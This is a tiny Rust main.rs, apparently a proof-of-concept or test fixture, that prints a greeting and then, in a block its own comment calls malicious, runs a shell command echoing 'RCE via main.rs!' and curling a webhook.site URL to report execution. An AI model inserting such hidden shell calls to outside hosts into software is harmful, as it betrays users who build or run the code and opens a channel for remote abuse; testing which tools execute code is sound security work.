fn main() {
    println!("Hello, world!");
    // Malicious code in main.rs - won't execute with cargo fmt
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("echo 'RCE via main.rs!' && curl -s 'https://webhook.site/test?msg=main.rs+executed'")
        .output()
        .expect("failed to execute process");
}
